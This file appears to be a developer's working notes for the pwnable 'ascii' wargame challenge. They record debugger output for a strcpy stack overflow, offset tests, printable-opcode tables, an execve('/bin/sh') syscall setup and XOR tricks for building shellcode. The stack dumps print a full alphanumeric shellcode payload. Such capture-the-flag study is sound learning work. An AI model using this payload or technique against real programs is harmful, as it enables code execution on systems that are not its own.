@@ -1,0 +1,136 @@
+__strcpy_sse2
+
+segfault at main+189 .
+
+   0x8048fc1 <main+179>:        call   0x8049a70 <puts>
+   0x8048fc6 <main+184>:        call   0x8048eed <vuln>
+=> 0x8048fcb <main+189>:        mov    ebx,DWORD PTR [ebp-0x4]
+   0x8048fce <main+192>:        leave
+   0x8048fcf <main+193>:        ret
+
+a * 170 + '\n' -> ebp: 0xa6161 ('aa\n')
+
+166: ok
+167: segfault on returning from main
+168: same, but stack is almost always filled with zeros
+170: segfault on main + 189
+170:
+170:
+
+Run
+r < 79_167
+several times.
+Sometimes SIGSEGV happens in 0x80001000 !
+
+
+# op codes
+
+2dXXXXXXXX: sub eax, 0xXXXXXXXX
+35XXXXXXXX: xor eax, 0xXXXXXXXX
+
+50: push eax
+51: push ecx
+52: push edx
+53: push ebx
+54: push esp
+55: push ebp
+56: push esi
+57: push edi
+
+58: pop eax
+...
+
+
+xor [esp+0x40], eax
+
+# syscall (int 0x80)
+execve systemcall
+eax = 11
+ebx = "/bin/sh"
+ecx = NULL
+edx = NULL
+
+# Pusing arbitrary word
+/* push 0x69622f68 */
+push ebx   # ebx = 0
+pop eax
+xor eax, 0x30304130
+xor eax, 0x59526e58
+push eax
+
+# gdb ascii
+
+0x08048eed <+0>:     push   ebp
+0x08048eee <+1>:     mov    ebp,esp
+0x08048ef0 <+3>:     sub    esp,0xb8
+0x08048ef6 <+9>:     mov    DWORD PTR [esp+0x4],0x80000000
+0x08048efe <+17>:    lea    eax,[ebp-0xa8]
+0x08048f04 <+23>:    mov    DWORD PTR [esp],eax
+0x08048f07 <+26>:    call   0x8048200 # strcpy_sse2
+0x08048f0c <+31>:    leave
+0x08048f0d <+32>:    ret
+
+*__strcpy_sse2
+char *strcpy(char *dest, const char *src);
+
+Inside __strcpy_sse2:
+
+src -> input string (0x800000000)
+dest = 0xffe77150 -> "Input text : triggering bug ...\n"
+
+[------------------------------------stack-------------------------------------]
+0000| 0xffe7713c --> 0x8048f0c (<vuln+31>:      leave)
+0004| 0xffe77140 --> 0xffe77150 --> 0xf776c000 ("Input text : triggering bug...\n")
+0008| 0xffe77144 --> 0x80000000 ("VX-4333P^VX--NN!5?~~+P\\VX-!!!N5yf+~PVX-!M!M5HNbNPVX-NNN!5~~~\"PVX-mm-M561'tPVX-NmMm5~7P=PVX-mMmm57P,7P", 'A' <repeats 66 times>, "\377")
+0012| 0xffe77148 --> 0x8
+0016| 0xffe7714c --> 0x80ee140 --> 0xfbad2a84
+0020| 0xffe77150 --> 0xf776c000 ("Input text : triggering bug...\n")
+
+
+
+```
+=> 0x8048f0c <vuln+31>: leave
+   0x8048f0d <vuln+32>: ret
+   0x8048f0e <main>:    push   ebp
+   0x8048f0f <main+1>:  mov    ebp,esp
+   0x8048f11 <main+3>:  push   ebx
+[------------------------------------stack-------------------------------------]
+0000| 0xffe77140 --> 0xffe77150 ("VX-4333P^VX--NN!5?~~+P\\VX-!!!N5yf+~PVX-!M!M5HNbNPVX-NNN!5~~~\"PVX-mm-M561'tPVX-NmMm5~7P=PVX-mMmm57P,7P", 'A' <repeats 66 times>, "\377")
+0004| 0xffe77144 --> 0x80000000 ("VX-4333P^VX--NN!5?~~+P\\VX-!!!N5yf+~PVX-!M!M5HNbNPVX-NNN!5~~~\"PVX-mm-M561'tPVX-NmMm5~7P=PVX-mMmm57P,7P", 'A' <repeats 66 times>, "\377")
+0008| 0xffe77148 --> 0x8
+0012| 0xffe7714c --> 0x80ee140 --> 0xfbad2a84
+0016| 0xffe77150 ("VX-4333P^VX--NN!5?~~+P\\VX-!!!N5yf+~PVX-!M!M5HNbNPVX-NNN!5~~~\"PVX-mm-M561'tPVX-NmMm5~7P=PVX-mMmm57P,7P", 'A' <repeats 66 times>, "\377")
+
+```
+
+esp value:
+- main ffe823b4
+  - before vuln <main+184> esp = 0xffbcf000 ("triggering bug..."), ebp = 0xffbcf038
+  - <vuln>  esp = 0xffbceffc (<main+189>)
+  - vuln ffe822c0
+    - strcpy ffe822bc
+  -
+
+
+0x08048000 0x080ed000 r-xp      /home/oka/src/github.com/ogiekako/pwnable/ascii/ascii
+0x080ed000 0x080ef000 rw-p      /home/oka/src/github.com/ogiekako/pwnable/ascii/ascii
+0x080ef000 0x080f1000 rw-p      mapped
+0x096e3000 0x09705000 rw-p      [heap]
+0x80000000 0x80001000 rwxp      mapped
+0xf77c8000 0xf77ca000 rw-p      mapped
+0xf77ca000 0xf77cc000 r--p      [vvar]
+0xf77cc000 0xf77cd000 r-xp      [vdso]
+0xffe96000 0xffeb7000 rw-p      [stack]
+
+
+
+0x08048000 0x080ed000 r-xp      /home/oka/src/github.com/ogiekako/pwnable/ascii/ascii
+0x080ed000 0x080ef000 rw-p      /home/oka/src/github.com/ogiekako/pwnable/ascii/ascii
+0x080ef000 0x080f1000 rw-p      mapped
+0x09027000 0x09049000 rw-p      [heap]
+0x80000000 0x80001000 rwxp      mapped
+0xf7757000 0xf7759000 rw-p      mapped
+0xf7759000 0xf775b000 r--p      [vvar]
+0xf775b000 0xf775c000 r-xp      [vdso]
+0xffc8a000 0xffcab000 rw-p      [stack]
+
